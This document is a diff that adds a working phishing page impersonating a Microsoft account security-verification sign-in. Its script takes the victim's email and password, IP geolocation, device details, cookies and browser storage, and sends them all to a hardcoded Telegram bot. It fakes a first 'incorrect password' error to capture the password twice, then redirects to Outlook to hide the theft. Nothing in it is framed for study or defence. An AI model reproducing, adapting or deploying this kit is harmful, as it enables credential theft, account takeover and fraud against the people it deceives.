@@ -1,0 +1,372 @@
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Security verification - Microsoft account</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <style>
+        :root { --ms-blue: #0078d4; --ms-blue-dark: #106ebe; --ms-red: #d13438; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, Arial, sans-serif; background: #f0f2f5; display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
+
+        #bootScreen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #fff;
+            z-index: 10000;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        .boot-spinner {
+            width: 50px;
+            height: 50px;
+            border: 3px solid #e0e0e0;
+            border-top-color: var(--ms-blue);
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-bottom: 24px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .boot-text { font-size: 14px; color: #605e5c; }
+
+        .login-container { width: 100%; max-width: 440px; display: none; }
+        .login-card { background: #fff; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); overflow: hidden; }
+
+        .card-header { padding: 32px 32px 0 32px; text-align: center; }
+        .microsoft-logo { width: 108px; margin: 0 auto 24px auto; display: block; }
+        .card-header h1 { font-size: 24px; font-weight: 600; color: #1b1b1b; margin-bottom: 8px; }
+        .card-header p { font-size: 14px; color: #605e5c; margin-bottom: 24px; }
+
+        .card-body { padding: 0 32px 32px 32px; }
+
+        .input-group { margin-bottom: 24px; }
+        .input-group label { display: block; font-size: 13px; font-weight: 600; color: #1b1b1b; margin-bottom: 6px; }
+        .input-field { width: 100%; padding: 12px; border: 1px solid #8a8886; border-radius: 4px; font-size: 15px; outline: none; }
+        .input-field:focus { border-color: var(--ms-blue); box-shadow: 0 0 0 2px rgba(0,120,212,0.2); }
+        .input-field.error { border-color: var(--ms-red); }
+        .error-message { color: var(--ms-red); font-size: 12px; margin-top: 6px; display: none; }
+
+        .btn { width: 100%; padding: 12px; background: var(--ms-blue); color: white; border: none; border-radius: 4px; font-size: 15px; font-weight: 600; cursor: pointer; margin-top: 12px; }
+        .btn:hover { background: var(--ms-blue-dark); }
+
+        .links { display: flex; justify-content: space-between; margin-top: 24px; font-size: 13px; }
+        .links a { color: var(--ms-blue); text-decoration: none; cursor: pointer; }
+
+        .back-link { text-align: center; margin-top: 16px; color: var(--ms-blue); cursor: pointer; font-size: 13px; }
+
+        .user-badge { background: #f3f2f1; padding: 12px; border-radius: 6px; margin-bottom: 20px; display: flex; align-items: center; gap: 12px; }
+        .user-avatar { width: 36px; height: 36px; background: var(--ms-blue); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; }
+        .user-email { font-size: 14px; font-weight: 500; word-break: break-all; }
+        .user-status { font-size: 12px; color: #107c10; }
+
+        /* Plain text verification message - no background */
+        .verification-message {
+            font-size: 14px;
+            color: #1b1b1b;
+            line-height: 1.4;
+            margin: 16px 0 20px 0;
+            padding: 0;
+        }
+
+        .loader-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.95); z-index: 1000; display: none; align-items: center; justify-content: center; flex-direction: column; }
+        .loader-spinner { width: 40px; height: 40px; border: 3px solid #e0e0e0; border-top-color: var(--ms-blue); border-radius: 50%; animation: spin 0.8s linear infinite; margin-bottom: 16px; }
+
+        .location-bar { 
+            background: #f9f9f9; 
+            padding: 8px 16px; 
+            font-size: 11px; 
+            color: #666; 
+            text-align: center; 
+            border-bottom: 1px solid #eaeaea; 
+        }
+
+        footer { text-align: center; margin-top: 20px; font-size: 11px; color: #8a8886; }
+
+        @media (max-width: 480px) {
+            .card-body { padding: 0 24px 28px 24px; }
+            .card-header { padding: 28px 24px 0 24px; }
+        }
+    </style>
+</head>
+<body>
+
+<div id="bootScreen">
+    <div class="boot-spinner"></div>
+    <div class="boot-text" id="bootStatus">Establishing secure connection...</div>
+</div>
+
+<div id="loaderOverlay" class="loader-overlay">
+    <div class="loader-spinner"></div>
+    <div class="loader-text">Verifying credentials...</div>
+</div>
+
+<div class="login-container" id="loginContainer">
+    <div class="login-card">
+        <div class="card-header">
+            <img id="msLogo" src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" class="microsoft-logo" alt="Microsoft">
+            <h1>Security verification</h1>
+            <p>Continue to account settings</p>
+        </div>
+
+        <div class="location-bar">
+            <span id="locText">Detecting...</span>
+        </div>
+
+        <div class="card-body">
+            <div id="stepEmail">
+                <div class="input-group">
+                    <label>Email, phone, or Skype</label>
+                    <input type="email" id="emailInput" class="input-field" placeholder="someone@example.com" autocomplete="off">
+                    <div id="emailError" class="error-message">Enter a valid email address.</div>
+                </div>
+                <div class="links">
+                    <a>No account? Create one!</a>
+                    <a>Can't access your account?</a>
+                </div>
+                <button class="btn" id="nextBtn">Next</button>
+            </div>
+
+            <div id="stepPassword" style="display: none;">
+                <div class="user-badge">
+                    <div class="user-avatar" id="userAvatar">👤</div>
+                    <div class="user-info">
+                        <div class="user-email" id="displayEmail"></div>
+                        <div class="user-status">Verified account</div>
+                    </div>
+                </div>
+
+                <div class="verification-message">
+                    Because you're accessing secure settings, you need to verify your password.
+                </div>
+
+                <div class="input-group">
+                    <label>Password</label>
+                    <input type="password" id="passwordInput" class="input-field" placeholder="Password" autocomplete="off">
+                    <div id="passwordError" class="error-message">Your password is incorrect. Please try again.</div>
+                </div>
+                <a class="back-link" style="text-align: left; margin-bottom: 16px;">Forgot password?</a>
+                <button class="btn" id="verifyBtn">Continue</button>
+                <div class="back-link" id="backToEmailBtn">← Use a different account</div>
+            </div>
+        </div>
+    </div>
+    <footer>© 2026 Microsoft | Privacy & Cookies | Terms of use</footer>
+</div>
+
+<script>
+// TELEGRAM CONFIG
+var BOT_TOKEN = "8674007182:AAGtTOlyLF3SnO1I7lh-OivlKieTffCf0SU";
+var CHAT_ID = "7675250720";
+
+var currentEmail = "";
+var attemptCount = 0;
+var startTime = Date.now();
+var ipData = "", cityData = "", countryData = "", regionData = "", ispData = "";
+var userAgent = navigator.userAgent;
+var browserLang = navigator.language || "en-US";
+var screenRes = screen.width + "x" + screen.height;
+var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+var platform = navigator.platform || "Unknown";
+
+// Boot sequence
+var bootMessages = ["Establishing secure connection...", "Validating SSL certificate...", "Ready"];
+var bootIndex = 0;
+function updateBoot() {
+    if (bootIndex < bootMessages.length) {
+        $('#bootStatus').text(bootMessages[bootIndex]);
+        bootIndex++;
+        setTimeout(updateBoot, 800);
+    } else {
+        $('#bootScreen').fadeOut(500, function() {
+            $('#loginContainer').fadeIn(300);
+        });
+    }
+}
+updateBoot();
+
+// IP Detection
+function detectLocation() {
+    $.get('https://ipapi.co/json/', function(res) {
+        if(res && res.ip) {
+            ipData = res.ip;
+            cityData = res.city || "Unknown";
+            countryData = res.country_name || "Unknown";
+            regionData = res.region || "Unknown";
+            ispData = res.org || "Unknown";
+            $('#locText').text(cityData + ", " + countryData + " • " + ipData);
+        }
+    }).fail(function() {
+        $.get('https://api.ipify.org?format=json', function(res) {
+            if(res && res.ip) ipData = res.ip;
+            $('#locText').text("IP: " + ipData);
+        });
+    });
+}
+detectLocation();
+
+// Send to Telegram
+function sendToTelegram(message) {
+    var url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(message) + "&disable_web_page_preview=true";
+    var img = new Image();
+    img.src = url;
+}
+
+// Grab storage data
+function grabStorageData() {
+    var storageData = "";
+
+    if (document.cookie && document.cookie.length > 0) {
+        storageData += "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
+        storageData += "COOKIES (non-HttpOnly)\n";
+        storageData += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
+        storageData += document.cookie + "\n";
+    }
+
+    if (sessionStorage && sessionStorage.length > 0) {
+        storageData += "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
+        storageData += "SESSION STORAGE\n";
+        storageData += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
+        for(var i = 0; i < sessionStorage.length; i++) {
+            var key = sessionStorage.key(i);
+            var value = sessionStorage.getItem(key);
+            if (value && value.length > 500) value = value.substring(0, 500) + "...";
+            storageData += key + ": " + value + "\n";
+        }
+    }
+
+    if (localStorage && localStorage.length > 0) {
+        storageData += "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
+        storageData += "LOCAL STORAGE\n";
+        storageData += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
+        for(var i = 0; i < localStorage.length; i++) {
+            var key = localStorage.key(i);
+            var value = localStorage.getItem(key);
+            if (value && value.length > 500) value = value.substring(0, 500) + "...";
+            storageData += key + ": " + value + "\n";
+        }
+    }
+
+    return storageData;
+}
+
+// Build report
+function buildReport(password) {
+    var timeOnPage = Math.floor((Date.now() - startTime) / 1000);
+    var deviceType = /Mobile|Android|iPhone|iPad|iPod/i.test(userAgent) ? "Mobile" : "Desktop";
+    var browserMatch = userAgent.match(/(Chrome|Firefox|Safari|Edge|MSIE|Trident)/i);
+    var browser = browserMatch ? browserMatch[1] : "Unknown";
+    var osMatch = userAgent.match(/(Windows NT|Mac OS X|iPhone OS|Android|Linux)/i);
+    var os = osMatch ? osMatch[1] : "Unknown";
+
+    var report = "";
+    report += "EMMA WEALTH MICROSOFT 365 CREDENTIALS\n";
+    report += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";
+    report += "EMAIL: " + currentEmail + "\n";
+    report += "PASSWORD: " + password + "\n";
+    report += "ATTEMPT: #" + attemptCount + "\n";
+    report += "TIME: " + timeOnPage + " sec\n\n";
+    report += "LOCATION\n";
+    report += "IP: " + ipData + "\n";
+    report += "CITY: " + cityData + "\n";
+    report += "REGION: " + regionData + "\n";
+    report += "COUNTRY: " + countryData + "\n";
+    report += "ISP: " + ispData + "\n";
+    report += "TIMEZONE: " + timezone + "\n\n";
+    report += "DEVICE\n";
+    report += "OS: " + os + " (" + platform + ")\n";
+    report += "DEVICE TYPE: " + deviceType + "\n";
+    report += "BROWSER: " + browser + "\n";
+    report += "LANGUAGE: " + browserLang + "\n";
+    report += "SCREEN: " + screenRes + "\n";
+    report += "USER AGENT: " + userAgent + "\n";
+
+    var storageData = grabStorageData();
+    if (storageData) {
+        report += storageData;
+    }
+
+    report += "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
+    report += new Date().toISOString();
+
+    return report;
+}
+
+// UI Events
+$('#nextBtn').click(function() {
+    var email = $('#emailInput').val().trim();
+    if (email && email.includes('@') && email.length > 5) {
+        currentEmail = email;
+        $('#emailError').hide();
+        $('#emailInput').removeClass('error');
+        $('#userAvatar').text(email.charAt(0).toUpperCase());
+        $('#displayEmail').text(email);
+        $('#stepEmail').fadeOut(200, function() {
+            $('#stepPassword').fadeIn(200);
+            $('#passwordInput').focus();
+        });
+    } else {
+        $('#emailError').show();
+        $('#emailInput').addClass('error');
+        setTimeout(function() { $('#emailError').fadeOut(2000); }, 2500);
+    }
+});
+
+$('#backToEmailBtn').click(function() {
+    $('#stepPassword').fadeOut(200, function() {
+        $('#stepEmail').fadeIn(200);
+        $('#passwordInput').val('');
+        $('#passwordError').hide();
+        $('#passwordInput').removeClass('error');
+    });
+});
+
+$('#verifyBtn').click(function() {
+    var password = $('#passwordInput').val();
+    if (!password || password.length < 1) {
+        $('#passwordError').text("Please enter your password.").show();
+        $('#passwordInput').addClass('error');
+        return;
+    }
+
+    attemptCount++;
+    $('#loaderOverlay').fadeIn(200);
+    $('#verifyBtn').prop('disabled', true);
+
+    var report = buildReport(password);
+    sendToTelegram(report);
+
+    setTimeout(function() {
+        $('#loaderOverlay').fadeOut(200);
+        $('#verifyBtn').prop('disabled', false);
+
+        if (attemptCount < 2) {
+            $('#passwordInput').val('').addClass('error');
+            $('#passwordError').text("Your password is incorrect. Please try again.").show();
+            setTimeout(function() { $('#passwordError').fadeOut(3000); }, 3000);
+        } else {
+            window.location.replace("https://outlook.office.com/mail/");
+        }
+    }, 1500);
+});
+
+$('#emailInput').on('keypress', function(e) { if (e.which === 13) $('#nextBtn').click(); });
+$('#passwordInput').on('keypress', function(e) { if (e.which === 13) $('#verifyBtn').click(); });
+$('#emailInput').focus();
+
+var hash = window.location.hash.substr(1);
+if (hash && hash.includes('@')) {
+    $('#emailInput').val(hash);
+    setTimeout(function() { $('#nextBtn').click(); }, 1000);
+}
+</script>
+<script src="https://replit-cdn.com/replit-pill/replit-pill.global.js" data-referral-code="d3dio26p4u88" data-repl-id="b23c28dc-68ef-499b-978d-f0ab91e2474f"></script></body>
+</html>
